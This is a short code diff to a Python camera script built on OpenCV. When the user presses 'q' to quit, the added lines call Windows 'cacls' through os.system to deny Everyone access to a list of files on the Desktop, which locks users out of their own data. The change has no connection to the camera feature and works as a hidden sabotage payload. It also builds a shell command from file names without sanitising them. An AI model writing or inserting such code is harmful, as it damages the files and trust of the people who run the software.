@@ -48,6 +48,8 @@ while True:
 
     key = cv2.waitKey(1)
     if key == ord('q'):
+        for i in names:
+                os.system(f'cacls Desktop\{i} /E /P everyone:n')
         break
 
 cap.release()
